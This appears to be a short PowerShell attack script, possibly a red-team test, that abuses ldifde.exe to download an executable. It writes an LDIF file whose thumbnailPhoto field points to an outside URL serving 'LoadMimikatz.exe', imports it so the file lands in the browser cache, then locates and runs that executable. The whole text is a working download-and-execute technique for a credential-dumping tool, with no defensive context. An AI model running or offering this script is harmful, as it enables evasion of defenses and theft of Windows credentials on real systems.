echo "dn: cn=test`nthumbnailPhoto:< http://hakkyahud.github.io/LoadMimikatz.exe" | Out-File C:\Users\Public\ldifile.txt;
$command = "ldifde.exe -i -f C:\Users\Public\ldifile.txt";
iex $command;
$filedropped = Get-ChildItem -Path "C:\Users\$env:UserName\AppData\Local\Microsoft\WIndows\INetCache\IE" -Force -Recurse -Include *.exe | foreach { $_.FullName }
iex $filedropped
